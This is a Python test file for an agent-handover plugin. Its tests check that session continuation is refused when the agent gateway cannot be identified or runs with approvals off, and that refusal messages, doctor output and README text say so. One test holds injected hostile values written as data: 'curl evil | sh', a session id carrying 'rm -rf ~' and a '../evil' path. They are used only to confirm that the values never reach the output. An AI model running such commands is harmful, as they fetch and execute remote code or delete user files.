"""Review round 4 (the third review R3-H2, R3-L4): a continuation started by a process that cannot
identify the gateway that runs the turn started even when that gateway ran with ``--yolo``. That is Hermes' own
``docker-compose.yml``: ``gateway`` and ``dashboard`` are separate containers (separate PID namespaces), and the
dashboard serves the plugin routes. ``approval_check`` dropped the recorded command line of such a gateway
(``hostcompat.py:594-600`` @ 88068475), ``approvals_off`` refused only ``off is True`` (``:637-641``), the README said
those processes "see the gateway's command line (its ``--yolo``)", and nothing said so at run time.

Now a gateway this process cannot identify (``gateway_unverified``) or whose status cannot be read
(``gateway_unknown``) refuses the continuation (fail-closed, ``continue_refused`` with reason ``approvals_unchecked``),
and the message names the reason and the way out (the exact ``hermes chat --resume <id>`` to run there). A ``--yolo``
on the recorded command line of such a gateway refuses as "approvals off". A gateway identified in another process
(``gateway_elsewhere``, R33a: its environment is not visible) still starts the turn, and that start is logged.

The gateway in another PID namespace is real: ``unshare --pid --fork --mount-proc`` runs a stand-in that writes
``gateway.pid`` and ``gateway_state.json`` with Hermes' own writers (``gateway.status.write_pid_file``,
``write_runtime_status``), so its records carry the PID of its own namespace — as the gateway container's do. The
reviewer's probe (a fresh record whose PID is not alive here) runs as well, without ``unshare``."""

from __future__ import annotations

import contextlib
import json
import logging
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path

import pytest

from ctx_handover.engine import commands, hostcompat, jobs, surfaces
from ctx_handover.engine.errors import ContinueRefused
from ctx_handover.engine.model import CommitAck, Mode
from ctx_handover.tests.conftest import require_upstream
from ctx_handover.tests.integration.harness import Home
from ctx_handover.tests.unit.F.test_r3_f_h2 import (
    JOB,
    SID,
    _doctor_line,
    _popen,
    _readme,
    _record,
    _spawner,
    _Started,
    gateway,
)

PLUGIN_ROOT = Path(hostcompat.__file__).resolve().parents[1]

pytestmark = pytest.mark.skipif(not Path("/proc/self/cmdline").exists(), reason="the gateway stand-in needs /proc")


@pytest.fixture(autouse=True)
def _upstream():
    require_upstream()
    jobs._reset_for_tests()
    yield
    jobs._reset_for_tests()


_STANDIN = """import os, sys, time
from gateway.status import write_pid_file, write_runtime_status
write_pid_file()
write_runtime_status(gateway_state="running")
time.sleep(300)
"""


def _unshare() -> str | None:
    exe = shutil.which("unshare")
    if not exe:
        return None
    try:
        subprocess.run(  # noqa: S603 - fixed tool and arguments
            [exe, "--pid", "--fork", "--mount-proc", "true"], check=True, capture_output=True, timeout=20
        )
    except (OSError, subprocess.SubprocessError):
        return None
    return exe


@contextlib.contextmanager
def foreign_gateway(home: Home, tmp_path: Path, *flags: str):
    """A gateway in a PID namespace of its own (``…/hermes <flags> gateway run``), its records written by Hermes."""
    exe = _unshare()
    if exe is None:
        pytest.skip("no PID namespace here (unshare missing or not permitted)")
    script = tmp_path / f"ns-{time.monotonic_ns()}" / "hermes"
    script.parent.mkdir(parents=True)
    script.write_text(_STANDIN, encoding="utf-8")
    env = {**os.environ, **home.env(), "PYTHONDONTWRITEBYTECODE": "1"}
    proc = subprocess.Popen(  # noqa: S603 - fixed tool, this interpreter, a fixed script
        [exe, "--pid", "--fork", "--mount-proc", "--kill-child", sys.executable, str(script), *flags, "gateway", "run"],
        env=env,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    state = home.hermes_home / "gateway_state.json"
    try:
        deadline = time.monotonic() + 20
        while True:
            assert proc.poll() is None, "the stand-in ended"
            with contextlib.suppress(OSError, ValueError):
                record = json.loads(state.read_text(encoding="utf-8"))
                if record.get("gateway_state") == "running" and (home.hermes_home / "gateway.pid").exists():
                    break
            assert time.monotonic() < deadline, "the stand-in never wrote its records"
            time.sleep(0.02)
        yield record
    finally:
        proc.kill()  # the stand-in is its namespace's init and ignores SIGTERM; --kill-child takes it along
        proc.wait(20)
        for name in ("gateway.pid", "gateway_state.json", "gateway.lock"):
            with contextlib.suppress(FileNotFoundError):
                (home.hermes_home / name).unlink()


def _refusal(home: Home) -> ContinueRefused:
    """The production spawner (``jobs.make_local_apis``, its ``approvals_off`` wiring) for a request of a paired
    device; ``popen`` raises ``_Started`` so a start is visible."""
    spawner = _spawner(home)
    spawner._popen = _popen
    with pytest.raises(ContinueRefused) as info:
        spawner.spawn(SID, "go on", JOB, requested_by="laptop")
    return info.value


# ---------------------------------------------------------------------------------------------------------
# R3-H2: a gateway this process cannot identify
# ---------------------------------------------------------------------------------------------------------


def test_r4_f_h2_gateway_in_another_pid_namespace_refuses_the_continuation(tmp_path):
    """★ The reviewer's setup (Hermes' docker-compose: gateway and dashboard in separate containers): the gateway runs
    in a PID namespace of its own, this process (the dashboard or a terminal) cannot identify it. Without ``--yolo``
    the continuation is refused as "not checked"; the refusal names why and the command to run there by hand.

    Red @ 88068475: ``spawn`` reached ``popen`` (``_Started``) — ``gateway_unverified`` was ``off None`` and
    ``approvals_off`` False."""
    home = Home(tmp_path, "server", settings={"allow_remote_continue": True})
    with home.active(), foreign_gateway(home, tmp_path) as record:
        assert record["pid"] != os.getpid()
        check = hostcompat.approval_check(hostcompat.load_config())
        assert (check.off, check.why, check.pid) == (None, "gateway_unverified", None)
        err = _refusal(home)
    assert err.details.get("reason") == "approvals_unchecked", err.details
    assert err.details.get("why") == "gateway_unverified"
    assert (err.details.get("session_id"), err.details.get("profile")) == (SID, "default")
    assert f"`hermes -p default chat --resume {SID}`" in surfaces.render_error(err, "server")


def test_r4_f_h2_yolo_on_the_record_of_a_gateway_in_another_pid_namespace_counts(tmp_path):
    """★ The same gateway started with ``--yolo``: its own record (``argv``) says so, and that counts although its
    process cannot be identified here — refused as "approvals off".

    Red @ 88068475: ``spawn`` reached ``popen``; ``approval_check`` was
    ``(None, 'gateway_unverified', None, False)``."""
    home = Home(tmp_path, "server", settings={"allow_remote_continue": True})
    with home.active(), foreign_gateway(home, tmp_path, "--yolo"):
        check = hostcompat.approval_check(hostcompat.load_config())
        assert (check.off, check.why, check.pid, check.flag) == (True, "gateway_flag", None, True)
        err = _refusal(home)
    assert err.details.get("reason") == "approvals_off", err.details


@pytest.mark.parametrize("flags, reason", [((), "approvals_unchecked"), (("--yolo",), "approvals_off")])
def test_r4_f_h2_reviewer_probe_fresh_record_of_a_pid_not_alive_here(tmp_path, flags, reason):
    """★ The reviewer's probe: a fresh runtime record
    whose PID is not alive here stands for the other namespace. Refused either way.

    Red @ 88068475: "UNVERIFIED+YOLO spawn: STARTED (popen reached)"."""
    home = Home(tmp_path, "server", settings={"allow_remote_continue": True})
    with home.active():
        gone = subprocess.Popen([sys.executable, "-c", "pass"])
        gone.wait(10)
        _record(home, gone.pid, ["/usr/local/bin/hermes", *flags, "gateway", "run"])
        err = _refusal(home)
    assert err.details.get("reason") == reason, err.details


def test_r4_f_h2_gateway_status_that_cannot_be_read_refuses(tmp_path, monkeypatch):
    """Hermes' gateway check raising (``gateway_unknown``) is not identifiable either: refused, fail-closed.

    Red @ 88068475: ``spawn`` reached ``popen``."""
    import gateway.status as gs

    def boom(_home):
        raise OSError("unreadable")

    home = Home(tmp_path, "server", settings={"allow_remote_continue": True})
    with home.active():
        monkeypatch.setattr(gs, "live_gateway_pid_for_home", boom)
        err = _refusal(home)
    assert (err.details.get("reason"), err.details.get("why")) == ("approvals_unchecked", "gateway_unknown")


def test_r4_f_h2_terminal_take_without_a_paired_device_is_refused_too(tmp_path):
    """``hermes handover take|import --continue`` in a terminal (no requesting device) behind such a gateway: the
    same refusal — the rule is about who can see the gateway, not about who asked."""
    home = Home(tmp_path, "server")
    with home.active():
        gone = subprocess.Popen([sys.executable, "-c", "pass"])
        gone.wait(10)
        _record(home, gone.pid, ["/usr/local/bin/hermes", "gateway", "run"])
        spawner = _spawner(home)
        spawner._popen = _popen
        with pytest.raises(ContinueRefused) as info:
            spawner.spawn(SID, None, JOB, requested_by=None)
    assert info.value.details.get("reason") == "approvals_unchecked"


# ---------------------------------------------------------------------------------------------------------
# What still starts: an identified gateway in another process (R33a) — and the run-time message (R3-L4)
# ---------------------------------------------------------------------------------------------------------


def test_r4_f_h2_identified_gateway_elsewhere_starts_and_logs_that_approvals_were_not_checked(tmp_path, caplog):
    """★ R33a stays: a gateway identified in another process without ``--yolo`` starts the turn (its environment is
    not visible). R3-L4: that start is no longer silent — the starting process logs a warning that names the gateway,
    the limit and the step.

    Red @ 88068475: no log record (``caplog`` empty for ``ctx_handover.hostcompat``)."""
    home = Home(tmp_path, "server", settings={"allow_remote_continue": True})
    with home.active(), gateway(home, tmp_path) as pid:
        spawner = _spawner(home)
        spawner._popen = _popen
        with caplog.at_level(logging.WARNING, logger="ctx_handover.hostcompat"), pytest.raises(_Started):
            spawner.spawn(SID, "go on", JOB, requested_by="laptop")
    texts = [r.getMessage() for r in caplog.records if r.name == "ctx_handover.hostcompat"]
    assert len(texts) == 1, texts
    for part in (f"pid {pid}", "not checked", "HERMES_YOLO_MODE", "allow_remote_continue off"):
        assert part in texts[0], (part, texts[0])


def test_r4_f_h2_checked_starts_log_nothing(tmp_path, caplog):
    """No gateway of the profile runs (approvals apply, checked): no warning — the message marks the one case."""
    home = Home(tmp_path, "server", settings={"allow_remote_continue": True})
    with home.active():
        spawner = _spawner(home)
        spawner._popen = _popen
        with caplog.at_level(logging.WARNING, logger="ctx_handover.hostcompat"), pytest.raises(_Started):
            spawner.spawn(SID, "go on", JOB, requested_by="laptop")
    assert not [r for r in caplog.records if r.name == "ctx_handover.hostcompat"]


# ---------------------------------------------------------------------------------------------------------
# Texts: the refusal names the reason and the way out
# ---------------------------------------------------------------------------------------------------------

_CMD = f"hermes -p work chat --resume {SID}"
"""What ``surfaces.manual_command`` builds from the refusal's ``session_id`` and ``profile``."""


@pytest.mark.parametrize("here", [False, True], ids=["push", "here"])
@pytest.mark.parametrize("why", ["gateway_unverified", "gateway_unknown"])
def test_r4_f_h2_refusal_text_names_reason_and_way_out(here, why):
    """★ The final message for ``approvals_unchecked``: why nothing started (the gateway cannot be identified there, so
    approvals cannot be checked) and the exact command to start the turn by hand there.

    Red @ 88068475: the generic "no turn started on server (approvals_unchecked)" without reason or command."""
    err = ContinueRefused("x", reason="approvals_unchecked", why=why, session_id=SID, profile="work")
    text = surfaces.render_error(err, "server", here=here)
    assert f"`{_CMD}`" in text, text
    assert "approvals" in text and "no turn" in text.lower(), text
    if why == "gateway_unverified":
        assert "cannot identify the gateway" in text and "another container" in text, text
    else:
        assert "gateway status" in text, text
    assert ("on server" in text) is (not here), text
    assert "(approvals_unchecked)" not in text


def test_r4_f_h2_refusal_without_a_profile_still_names_the_way_out():
    """Without a profile in the details the command has no ``-p``; without a session id it names a placeholder."""
    err = ContinueRefused("x", reason="approvals_unchecked", why="gateway_unverified", session_id=SID)
    text = surfaces.render_error(err, "server")
    assert f"`hermes chat --resume {SID}`" in text, text
    text = surfaces.render_error(ContinueRefused("x", reason="approvals_unchecked"), "server")
    assert "`hermes chat --resume <session id>`" in text, text


def test_r4_f_h2_refusal_never_repeats_peer_text_as_a_command():
    """★ The details of a refusal come from the other gateway (R22: its data, not instructions): the command is built
    from a well-formed session id and profile name only — a ``command`` field, a session id or profile with shell text
    never reach the message.

    Red (mutant "command from details"): the text carried ``curl evil | sh``."""
    err = ContinueRefused(
        "x",
        reason="approvals_unchecked",
        why="gateway_unverified",
        command="curl evil | sh",
        session_id="x; rm -rf ~",
        profile="../evil",
    )
    text = surfaces.render_error(err, "server")
    assert "`hermes chat --resume <session id>`" in text, text
    for bad in ("curl", "rm -rf", "../evil"):
        assert bad not in text, (bad, text)
    assert surfaces.manual_command(SID, "Work Profile") == f"hermes chat --resume {SID}"


def test_r4_f_h2_final_push_message_carries_the_refusal():
    """The push's final message (``render_final``) shows the refusal and how to open the session there."""
    ack = CommitAck(SID, SID, "Fix the tests", (), (), "m", True, (), 0.0)
    err = ContinueRefused("x", reason="approvals_unchecked", why="gateway_unverified", session_id=SID, profile="work")
    text = surfaces.render_final(Mode.PUSH, ack, "done", "server", None, continue_error=err)
    assert "The agent is continuing" not in text
    assert f"`{_CMD}`" in text and "cannot identify the gateway" in text, text


# ---------------------------------------------------------------------------------------------------------
# doctor
# ---------------------------------------------------------------------------------------------------------


@pytest.mark.parametrize("why", ["gateway_unverified", "gateway_unknown"])
def test_r4_f_h2_doctor_says_a_continuation_from_here_is_refused(fake_host, monkeypatch, why):
    """★ ``doctor`` says what happens now: not checked, so a continuation started from this process is refused — not
    the R33a limit "leave allow_remote_continue off" that only applies where the turn would start.

    Red @ 88068475: the line ended in "… leave allow_remote_continue off on a gateway given HERMES_YOLO_MODE" (the
    continuation started)."""
    line = _doctor_line(fake_host, monkeypatch, hostcompat.ApprovalCheck(None, why))
    assert line["ok"] is None, line
    for part in ("not checked", "refused", "hermes chat --resume"):
        assert part in line["detail"], (part, line["detail"])
    assert "leave allow_remote_continue off" not in line["detail"], line["detail"]


def test_r4_f_h2_doctor_real_check_behind_a_gateway_in_another_namespace(tmp_path):
    """The real ``hermes handover doctor`` in a terminal next to a gateway in another PID namespace."""
    from ctx_handover.tests.integration._int3_helpers import surface

    home = Home(tmp_path, "server", settings={"allow_remote_continue": True})
    home.identity()
    with foreign_gateway(home, tmp_path):
        call, _ = surface(home, "doctor")
    line = next(x for x in "\n".join(call.out).splitlines() if "allow_remote_continue" in x)
    assert "cannot identify" in line and "refused" in line, line


# ---------------------------------------------------------------------------------------------------------
# README and settings form
# ---------------------------------------------------------------------------------------------------------


def _limits_bullet() -> str:
    limits = _readme().split("## Limits — read this first", 1)[1].split("## What the lock", 1)[0]
    return next(p for p in limits.split(" - ") if p.startswith("**Continuation and approvals.**"))


def test_r4_f_h2_readme_names_the_unidentifiable_gateway():
    """★ The Limits bullet says what holds where the gateway cannot be identified — Hermes' docker-compose named —
    and the command line is promised only for a gateway those processes can identify.

    Red @ 88068475: "… read the config and see the gateway's command line (its `--yolo`) but not its environment" for
    every separate process, and nothing about a gateway in another container."""
    bullet = _limits_bullet()
    for part in (
        "cannot identify",
        "another container or PID namespace",
        "`docker-compose.yml`",
        "no continuation starts",
        "`hermes chat --resume <id>`",
        "logs a warning",
    ):
        assert part in bullet, (part, bullet)
    head, _, tail = bullet.partition("see the gateway's command line (its `--yolo`)")
    assert tail, bullet
    assert "where they can identify the gateway" in head[-200:], head[-200:]


def test_r4_f_h2_readme_commands_and_settings_name_the_refusal():
    """Commands, Unredacted and the settings form carry the same rule."""
    import hermes_yaml as yaml

    text = _readme()
    commands_part = text.split("**Commands:**", 1)[1].split("**Background work:**", 1)[0]
    assert "nor when that process cannot identify the gateway that runs the turn" in commands_part, commands_part
    unredacted = text.split("**Unredacted:**", 1)[1].split("**Not moved:**", 1)[0]
    assert "refused when that process cannot identify the gateway that runs it" in unredacted, unredacted
    schema = yaml.safe_load((PLUGIN_ROOT / "plugin.yaml").read_text(encoding="utf-8"))["config_schema"]
    desc = schema["allow_remote_continue"]["description"]
    assert "cannot identify" in desc and "separate container" in desc, desc


def test_r4_f_h2_readme_reads_name_the_hermes_root_files():
    """★ Regel 13 (R3-L4 second half): the gateway files of the Hermes root are read too — the README says so.

    Red @ 88068475: "the identity of this profile's running gateway" only."""
    reads = _readme().split("**Reads:**", 1)[1].split("**Writes:**", 1)[0]
    assert "this profile's running gateway" not in reads, reads
    assert "of this profile and of the Hermes root" in reads, reads


def test_r4_f_h2_doctor_and_runtime_check_read_the_hermes_root_record(tmp_path):
    """What the Reads sentence names: in a named profile, a ``--yolo`` gateway known only from the Hermes root's
    records is found (the root's ``gateway.pid``/``gateway_state.json`` are read)."""
    root = tmp_path / "root"
    profile_home = root / "profiles" / "work"
    profile_home.mkdir(parents=True)
    user_home = tmp_path / "uhome"
    user_home.mkdir()
    saved = {k: os.environ.get(k) for k in ("HERMES_HOME", "HOME")}
    os.environ.update({"HERMES_HOME": str(profile_home), "HOME": str(user_home)})
    try:
        assert hostcompat.hermes_root() == root
        rooted = type("R", (), {"hermes_home": root})()
        with gateway(rooted, tmp_path, "--yolo") as pid:
            check = hostcompat.approval_check({})
            assert (check.off, check.why, check.pid) == (True, "gateway_flag", pid)
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


def test_r4_f_h2_doctor_text_module_keeps_the_limit_sentence():
    """The R33a limit text in ``doctor`` (``_ELSEWHERE``) now says it applies where the gateway is identified."""
    assert "identif" in commands._ELSEWHERE, commands._ELSEWHERE


def test_r4_f_h2_doctor_does_not_log_the_start_warning(tmp_path, caplog):
    """The warning is about a start (R3-L4): ``doctor`` next to an identified gateway elsewhere says "not checked" in
    its line and logs nothing."""
    from ctx_handover.tests.integration._int3_helpers import surface

    home = Home(tmp_path, "server", settings={"allow_remote_continue": True})
    home.identity()
    with gateway(home, tmp_path), caplog.at_level(logging.WARNING, logger="ctx_handover.hostcompat"):
        call, _ = surface(home, "doctor")
    line = next(x for x in "\n".join(call.out).splitlines() if "allow_remote_continue" in x)
    assert "not checked" in line, line
    assert not [r for r in caplog.records if r.name == "ctx_handover.hostcompat"]
